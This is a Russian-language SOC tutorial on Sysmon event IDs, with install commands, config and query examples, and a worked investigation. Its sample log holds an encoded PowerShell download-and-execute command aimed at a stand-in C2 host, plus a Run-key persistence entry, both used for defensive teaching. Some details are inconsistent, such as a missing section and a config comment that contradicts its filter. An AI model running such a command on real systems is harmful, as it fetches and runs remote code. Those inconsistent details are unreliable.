# Ключевые события Sysmon

## 1. Sysmon в ландшафте инструментов телеметрии Windows

System Monitor (Sysmon) — это системная служба и драйвер режима ядра из набора утилит Sysinternals, разработанная для регистрации низкоуровневой активности ОС в специализированный журнал Windows Event Log `Microsoft-Windows-Sysmon/Operational`[`1`]. В отличие от встроенного аудита безопасности, который фиксирует события на уровне доступа к объектам и операций учётных записей, Sysmon предоставляет атомарные, детерминированные записи о конкретных системных действиях: создании процессов, сетевых соединениях, изменении файлов и реестра, загрузке драйверов и библиотек. Каждая запись обогащена метаданными — хэшами исполняемых файлов, GUID процессов, полной командной строкой, информацией о цифровой подписи и т.д., — что превращает журнал в централизованный граф событий, поддающийся корреляции без необходимости перекрёстного сопоставления разрозненных логов.

Для специалиста SOC уровня L1 Sysmon выступает первичным источником фактов при триаже оповещений. Сигнатуры SIEM, написанные под стандартный Event ID 4688, часто не содержат командной строки и родительского процесса, вынуждая аналитика тратить время на дорасследование. Sysmon, напротив, вместе с событием предоставляет полную цепочку создания процесса (через `ParentProcessGuid`), что позволяет мгновенно подтвердить или исключить аномалию: например, запуск `powershell.exe` дочерним процессом от `WINWORD.EXE` заведомо подозрителен и не требует дополнительных запросов к контроллеру домена. Аналогично, сетевые соединения (Event ID 3) содержат не только IP-адреса и порты, но и точную привязку к процессу-инициатору (GUID), исключая гадание, какое из приложений сгенерировало трафик.

Ниже приведено сравнение возможностей Sysmon и встроенной подсистемы аудита безопасности Windows по ключевым параметрам, демонстрирующее, почему в задачах Threat Hunting и реагирования на инциденты полагаться исключительно на Security Log недостаточно.

| Параметр | Windows Security Audit (журнал безопасности) | Sysmon (журнал Microsoft-Windows-Sysmon/Operational) |
|----------|----------------------------------------------|--------------------------------------------------------|
| **Регистрация создания процесса** | Event ID 4688, по умолчанию командная строка не логируется, отсутствуют хэши файла и GUID. Требует включения политики «Audit Process Creation». | Event ID 1, полная командная строка (`CommandLine`), хэши SHA1/MD5/SHA256, `ProcessGuid`, `ParentProcessGuid`, `User` и уровень целостности. |
| **Сетевые соединения** | Event ID 5156 (Filtering Platform Connection), только низкоуровневая информация о сокете без привязки к имени процесса; для получения PID необходима дополнительная настройка аудита. | Event ID 3, фиксирует пару «процесс → соединение» с `ProcessGuid`, `Image`, `SourceIp`, `DestinationIp`, `SourcePort`, `DestinationPort`, протокол и инициативу соединения. |
| **Модификация реестра** | Event ID 4657 (изменение значения ключа), требует настройки SACL для каждого отслеживаемого ключа; предоставляет только имя ключа и процесс, без старых/новых значений. | Event ID 12 (создание/удаление ключа), Event ID 13 (установка значения), Event ID 14 (переименование ключа); содержат целевой ключ, новое значение, тип операции и образ процесса. |
| **Файловые операции** | Event ID 4663 (доступ к объекту), генерирует лавинообразный трафик при включении аудита для общих каталогов; отсутствуют хэши. | Event ID 11 (создание/перезапись файла), Event ID 2 (изменение времени создания), Event ID 15 (альтернативные потоки NTFS) с хэшами, процессом-инициатором и полным путём. |
| **Загрузка образов (DLL/драйверов)** | События 4610/4611 устарели и не предоставляют деталей о файлах. | Event ID 6 (загрузка драйвера), Event ID 7 (загрузка DLL) с информацией о подписи, хэшах и образе процесса, загрузившего библиотеку. |
| **Простота сбора и консолидации** | Журнал безопасности перегружен событиями входа/выхода, политик Kerberos и т.п., сложная фильтрация «на лету» штатными средствами. | Отдельный изолированный канал событий, легко перенаправляется Windows Event Collection (WEC) или SIEM-агентом без лишнего шума. |

Таким образом, Sysmon не заменяет аудит безопасности, но дополняет его структурированным графом действий, который снижает когнитивную нагрузку на специалиста L1 и ускоряет проверку гипотез вредоносной активности.

Представленный перечень охватывает стабильные и наиболее широко используемые типы записей, описанные в официальных источниках Microsoft и сообществе практиков.

Для удобства первичного анализа в SOC события логически группируются в несколько ключевых категорий:  
- **Жизненный цикл процессов и загрузка кода:** ID 1, 5, 6, 7, 8, 10. Позволяют проследить полную картину исполнения — от создания процесса до загрузки библиотек и межпроцессных внедрений.  
- **Сетевые взаимодействия:** ID 3, 22. Связывают активность в сети с конкретным процессом, что критически важно при расследовании обратных соединений и C2-коммуникаций.  
- **Файловая система и потоки:** ID 2, 11, 15, 23, 26. Охватывают появление новых файлов, манипуляции с временными метками, удаление и сокрытие данных.  
- **Реестр:** ID 12, 13, 14. Основной инструмент контроля изменений в конфигурации системы, особенно точек автозапуска.  
- **IPC и бесфайловые механизмы:** ID 17, 18, 19, 20, 21. Нацелены на выявление нестандартных способов взаимодействия и персистентности, характерных для продвинутых угроз.  
- **Служебные события:** ID 4, 16. Обеспечивают контроль за состоянием самого агента мониторинга.

Имея перед глазами такую таблицу, специалист L1 получает систематизированное представление о том, какие артефакты доступны для расследования, и может быстро выбрать нужный идентификатор для фильтрации или поиска.

## 3. Применение Sysmon в операционном процессе SOC L1

Эффективное использование Sysmon на первом рубеже реагирования требует понимания не только теоретического списка событий, но и практических процедур развёртывания, настройки и анализа. В этом разделе рассмотрены ключевые операции, выполняемые инженером или старшим аналитиком при внедрении, а также типовые запросы, которыми должен владеть L1-специалист.

**Установка и первичная конфигурация.** Sysmon поставляется в виде исполняемого файла `Sysmon64.exe` (и `Sysmon.exe` для 32-битных систем) из пакета Sysinternals [`5`]. Установка осуществляется из командной строки с правами администратора. Базовый синтаксис:

```powershell
.\Sysmon64.exe -i -accepteula
```

При этом запускается служба с конфигурацией по умолчанию, которая регистрирует все события, кроме сетевых (Event ID 3) — они требуют явного включения. Для продуктивных сред обязательна установка с файлом конфигурации XML, управляющим фильтрацией:

```powershell
.\Sysmon64.exe -i -accepteula sysmon-config.xml
```

В качестве отправной точки широко применяются тщательно выверенные сообществом конфигурации, например, `sysmon-config` от SwiftOnSecurity. Они включают целевые события и подавляют заведомо легитимный шум (исключение десятков системных путей, хэшей и т.д.), что критически важно для первого эшелона мониторинга.

Пример минимального конфигурационного файла, активирующего события создания процесса, сетевых соединений и изменения реестра (на основе фрагментов документации Elastic [`6`]), может выглядеть так:

```xml
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <!-- Включение события создания процесса с базовым исключением системных процессов -->
    <ProcessCreate onmatch="exclude">
      <Image condition="end with">\services.exe</Image>
      <Image condition="end with">\lsass.exe</Image>
    </ProcessCreate>
    <!-- Сетевые соединения: включаем, но игнорируем трафик в локальные сети -->
    <NetworkConnect onmatch="include">
      <DestinationIp condition="begin with">10.</DestinationIp>
      <DestinationIp condition="begin with">192.168.</DestinationIp>
      <DestinationIp condition="begin with">172.16.</DestinationIp>
      <DestinationIp condition="contains">203.0.113</DestinationIp>
    </NetworkConnect>
    <!-- Реестр: логируем SetValue для Run-ключей -->
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">\CurrentVersion\Run</TargetObject>
    </RegistryEvent>
  </EventFiltering>
</Sysmon>
```

Фильтры `onmatch="exclude"` или `"include"` задают логику «разрешить всё, кроме» или «запретить всё, кроме» соответственно. В реальности детальная настройка — отдельная инженерная задача, однако аналитику L1 важно понимать, что события, которые он видит в SIEM, уже прошли этот фильтр и представляют собой отобранную «выжимку» активности.

**Просмотр и поиск событий в реальном времени.** При расследовании инцидента аналитик часто подключается непосредственно к хосту для оперативного анализа. События Sysmon находятся в оснастке Event Viewer по пути: *Журналы приложений и служб → Microsoft → Windows → Sysmon → Operational*. Для быстрой фильтрации удобнее применять PowerShell:

```powershell
# Получить последние 20 событий создания процессов
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath '*[System[EventID=1]]' -MaxEvents 20 |
    Select-Object TimeCreated, Id, @{n='Image';e={$_.Properties[4].Value}}, @{n='CommandLine';e={$_.Properties[5].Value}}
```

Эта команда выводит понятную таблицу с временем, ID, образом и командной строкой. Для поиска по конкретному GUID процесса (например, при корреляции с другими событиями) можно использовать фильтр по хэш-таблице:

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=3} |
    Where-Object { $_.Properties[1].Value -eq '{искомый GUID}' }
```

**Интеграция с SIEM и типовые запросы для L1.** После доставки логов в централизованное хранилище (Splunk, Elastic, Sentinel) специалист L1 использует язык запросов для экспресс-триажа. Пример SPL-запроса, выявляющего подозрительные запуски `cmd.exe` из нетипичных родительских процессов:

```splunk
index=win EventID=1 Image=*\\cmd.exe ParentImage!=*\\explorer.exe ParentImage!=*\\svchost.exe
| table _time, Computer, ParentImage, Image, CommandLine
```

Аналогично в KQL для Microsoft Sentinel:

```kql
Sysmon
| where EventID == 1 and Process has "cmd.exe" and ParentProcess !has "explorer.exe"
| project TimeGenerated, Computer, ParentProcess, Process, CommandLine
```

Знание таких шаблонов поиска позволяет в течение нескольких минут оценить масштаб аномалии и принять решение об эскалации.

**Жизненный цикл события Sysmon.** Важно помнить, что:  
1. Sysmon не анализирует и не блокирует активность, он лишь фиксирует.  
2. События пишутся в UTC, что необходимо учитывать при сопоставлении с локальным временем пользователя.  
3. Фильтрация на уровне конфигурации влияет на полноту картины: если событие исключено, оно не попадёт в SIEM, и аналитик не сможет его увидеть. Поэтому при подозрении на компрометацию отдельного хоста всегда рекомендуется проверять журнал локально, чтобы исключить ошибки конфигурации.

## 4. Сквозной практический пример: расследование атаки на пользователя с помощью Sysmon

**Исходные условия.** Рабочая станция `WS-01` (Windows 11) с установленным Sysmon, конфигурация включает фильтрацию событий создания процессов, сетевых соединений и ключевых веток реестра. Логи пересылаются в SIEM. Аналитик SOC L1 получает уведомление о срабатывании правила на запуск `powershell.exe` с закодированной командной строкой из контекста приложения Microsoft Word.

**Задача.** Проверить, является ли инцидент реальным заражением, восстановить цепочку действий злоумышленника, получить минимальный набор доказательств для передачи на следующий уровень.

### Шаг 1. Проверка события создания процесса (Event ID 1)

Аналитик извлекает из SIEM запись, соответствующую алерту. Фрагмент сырого XML-события:

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-03-20T14:35:22.000000000Z" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WS-01.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}</Data>
    <Data Name="ProcessId">4521</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">"powershell" -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBwAGEAbABjAG8AeABwACcAKQAgAHwAIABJAEUAWAA=</Data>
    <Data Name="ParentProcessGuid">{AAAAAAAA-BBBB-CCCC-DDDD-EEEEEEEEEEEE}</Data>
    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
    <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /sso /path "C:\Users\user1\Downloads\invoice.docm"</Data>
    <Data Name="User">CORP\user1</Data>
  </EventData>
</Event>
```

**Анализ вывода.** `ParentImage` указывает на Microsoft Word, что нетипично для легитимного запуска PowerShell. Командная строка содержит `-EncodedCommand` с блоком base64, декодирование которого даёт: `IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.example.com/palcoxp') | IEX`. Это однозначный признак загрузки и выполнения скрипта с внешнего ресурса — операция, классифицируемая как вредоносная. `ProcessGuid` фиксируется для последующей корреляции.

### Шаг 2. Анализ сетевого соединения (Event ID 3)

Временная близость и общий `ProcessGuid` позволяют найти соответствующее сетевое событие. Лог:

```xml
<Event xmlns="..." >
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="..." />
    <EventID>3</EventID>
    <TimeCreated SystemTime="2026-03-20T14:35:24.100000000Z" />
    <Computer>WS-01.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="UtcTime">2026-03-20 14:35:24.101</Data>
    <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="SourceIp">192.168.10.15</Data>
    <Data Name="DestinationIp">203.0.113.5</Data>
    <Data Name="DestinationHostname">malicious-c2.example.com</Data>
    <Data Name="DestinationPort">443</Data>
    <Data Name="Protocol">tcp</Data>
    <Data Name="Initiated">true</Data>
  </EventData>
</Event>
```

**Результат.** Процесс с GUID `A1B2C3D4...` через две секунды после запуска инициировал исходящее HTTPS-соединение на хост `malicious-c2.example.com`, IP-адрес 203.0.113.5 (TEST-NET, в реальности будет принадлежать индикатору компрометации). Это завершает этап доставки полезной нагрузки.

### Шаг 3. Выявление закрепления через реестр (Event ID 13)

Следующим шагом проверяются события реестра в том же временном окне, инициированные тем же процессом. Обнаружена запись:

```xml
<Event xmlns="..." >
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="..." />
    <EventID>13</EventID>
    <TimeCreated SystemTime="2026-03-20T14:35:26.500000000Z" />
    <Computer>WS-01.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="UtcTime">2026-03-20 14:35:26.500</Data>
    <Data Name="ProcessGuid">{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MaliciousPayload</Data>
    <Data Name="Details">C:\Users\user1\AppData\Local\Temp\payload.exe</Data>
    <Data Name="EventType">SetValue</Data>
  </EventData>
</Event>
```

**Анализ.** Тем же ProcessGuid в ключ `HKCU\...\Run` добавлено значение `MaliciousPayload`, указывающее на свежесозданный исполняемый файл во временном каталоге пользователя. Это классическая техника персистентности (MITRE T1547.001). Заражённая машина будет запускать полезную нагрузку при каждом входе пользователя в систему.

### Шаг 4. Корреляция и формирование вывода

Сопоставляя GUID, временные метки и команды, аналитик восстанавливает полную картину:  
1. Пользователь открыл вредоносный документ `invoice.docm`, макрос которого запустил `WINWORD.EXE`.  
2. Дочерний процесс PowerShell скачал и выполнил обфусцированный скрипт из интернета.  
3. Скрипт установил соединение с управляющим сервером по порту 443.  
4. Для закрепления в системе скрипт модифицировал Run-ключ реестра.

Все шаги подкреплены неизменяемыми артефактами Sysmon, причём каждая запись содержит GUID, позволяющий однозначно связать события. Без Sysmon аналитик увидел бы лишь голый Event ID 4688 с ограниченной информацией, потребовалась бы сложная ручная сборка контекста из нескольких журналов. Здесь же в течение нескольких минут получено достаточное количество доказательств, чтобы классифицировать инцидент как подтверждённый и эскалировать его команде реагирования (IRT) с детальным отчётом.

**Ожидаемый вывод примера:** Sysmon предоставляет сквозную видимость полного цикла атаки, позволяя специалисту L1 эффективно расследовать инцидент, опираясь на структурированные и коррелируемые между собой события.
